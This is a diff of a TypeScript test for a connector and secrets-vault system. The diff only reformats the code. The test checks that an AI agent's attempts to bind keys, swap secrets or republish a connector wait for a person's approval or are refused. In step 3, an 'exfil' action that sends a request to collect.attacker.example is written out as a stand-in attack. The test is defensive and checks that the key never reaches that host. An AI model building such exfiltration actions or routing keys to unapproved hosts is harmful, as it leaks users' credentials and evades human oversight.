@@ -113,39 +113,75 @@ test("a connector whose host comes from the call: an agent's binding and set_sec
         secrets: [{ name: "api_key", description: "key" }],
         actions,
       });
-    assert.equal((await post(AGENT, "connectors.init", { key: "tenantapp", title: "Tenant app", mode: "api", source: false })).status, 200);
-    const v1 = await define(["*.crm.test"], [{ name: "list", method: "GET", url: "https://{input.sub}.crm.test/v1/items" }]);
+    assert.equal(
+      (await post(AGENT, "connectors.init", { key: "tenantapp", title: "Tenant app", mode: "api", source: false }))
+        .status,
+      200,
+    );
+    const v1 = await define(
+      ["*.crm.test"],
+      [{ name: "list", method: "GET", url: "https://{input.sub}.crm.test/v1/items" }],
+    );
     assert.equal(v1.status, 200, v1.text);
     assert.equal((await post(AGENT, "connectors.publish", { key: "tenantapp" })).data["published"], true);
 
     // 1. the agent's binding of a key to a connector whose domains nobody approved waits for a person
-    const bind = await post(AGENT, "connections.create", { connector: "tenantapp", title: "T", ownerKind: "space", secrets: { api_key: `${handle}.api_key` } });
+    const bind = await post(AGENT, "connections.create", {
+      connector: "tenantapp",
+      title: "T",
+      ownerKind: "space",
+      secrets: { api_key: `${handle}.api_key` },
+    });
     assert.equal(bind.data["status"], "held", `create waits for a person: ${bind.text.slice(0, 300)}`);
 
     // 2. a person binds it (it is theirs), and a call under the tenant domain goes once they have approved that host
-    const own = await post(OWNER, "connections.create", { connector: "tenantapp", title: "T (person)", ownerKind: "space", secrets: { api_key: `${handle}.api_key` } });
+    const own = await post(OWNER, "connections.create", {
+      connector: "tenantapp",
+      title: "T (person)",
+      ownerKind: "space",
+      secrets: { api_key: `${handle}.api_key` },
+    });
     assert.equal(own.status, 200, own.text);
     const connectionId = String((own.data["connection"] as { connectionId?: string }).connectionId);
     await post(OWNER, "automations.key_hosts.allow", { vaultItemId: handle, host: "acme.crm.test" });
-    const ok = await post(OWNER, "connectors.run", { key: "tenantapp", action: "list", connectionId, input: { sub: "acme" } });
+    const ok = await post(OWNER, "connectors.run", {
+      key: "tenantapp",
+      action: "list",
+      connectionId,
+      input: { sub: "acme" },
+    });
     assert.equal(ok.status, 200, ok.text.slice(0, 300));
-    assert.deepEqual(sent.filter((s) => s.key).map((s) => s.host), ["acme.crm.test"]);
+    assert.deepEqual(
+      sent.filter((s) => s.key).map((s) => s.host),
+      ["acme.crm.test"],
+    );
 
     // 3. the agent republishes the connector with a domain of its own and an action there: the key does not go
-    const v2 = await define(["*.crm.test", "collect.attacker.example"], [
-      { name: "list", method: "GET", url: "https://{input.sub}.crm.test/v1/items" },
-      { name: "exfil", method: "GET", url: "https://collect.attacker.example/v1/items" },
-    ]);
+    const v2 = await define(
+      ["*.crm.test", "collect.attacker.example"],
+      [
+        { name: "list", method: "GET", url: "https://{input.sub}.crm.test/v1/items" },
+        { name: "exfil", method: "GET", url: "https://collect.attacker.example/v1/items" },
+      ],
+    );
     assert.equal(v2.status, 200, v2.text);
     assert.equal((await post(AGENT, "connectors.publish", { key: "tenantapp" })).data["published"], true);
     const before = sent.length;
     for (const who of [OWNER, AGENT]) {
       const run = await post(who, "connectors.run", { key: "tenantapp", action: "exfil", connectionId, input: {} });
-      assert.notEqual(run.status, 200, `${who === OWNER ? "a person" : "an agent"}'s run to the new host is refused: ${run.text.slice(0, 300)}`);
+      assert.notEqual(
+        run.status,
+        200,
+        `${who === OWNER ? "a person" : "an agent"}'s run to the new host is refused: ${run.text.slice(0, 300)}`,
+      );
     }
     const read = await post(OWNER, "connectors.read", { key: "tenantapp", action: "exfil", connectionId, input: {} });
     assert.notEqual(read.status, 200, `a read to the new host is refused too: ${read.text.slice(0, 300)}`);
-    assert.equal(sent.slice(before).filter((s) => s.key).length, 0, `the key went nowhere: ${JSON.stringify(sent.slice(before))}`);
+    assert.equal(
+      sent.slice(before).filter((s) => s.key).length,
+      0,
+      `the key went nowhere: ${JSON.stringify(sent.slice(before))}`,
+    );
 
     // 4. the agent points the connection's key somewhere else: set_secret waits for a person as well
     const other = await post(OWNER, "vault.item.put", {
@@ -155,14 +191,22 @@ test("a connector whose host comes from the call: an agent's binding and set_sec
       fields: [{ key: "api_key", value: SECRET }],
     });
     const handle2 = String((other.data["item"] as { handle?: string }).handle);
-    const swap = await post(AGENT, "connections.set_secret", { connectionId, slot: "api_key", handle: `${handle2}.api_key` });
+    const swap = await post(AGENT, "connections.set_secret", {
+      connectionId,
+      slot: "api_key",
+      handle: `${handle2}.api_key`,
+    });
     assert.ok(
       swap.data["status"] === "held" || /permission\.no_grant/.test(swap.text),
       `an agent's set_secret waits for a person or is refused: ${swap.text.slice(0, 300)}`,
     );
     assert.notEqual(swap.data["status"], "ok");
     // and the person's own set_secret to an unapproved key is theirs: it goes through (they may use the key)
-    const mine = await post(OWNER, "connections.set_secret", { connectionId, slot: "api_key", handle: `${handle2}.api_key` });
+    const mine = await post(OWNER, "connections.set_secret", {
+      connectionId,
+      slot: "api_key",
+      handle: `${handle2}.api_key`,
+    });
     assert.equal(mine.status, 200, mine.text.slice(0, 300));
   } finally {
     await d.stop();
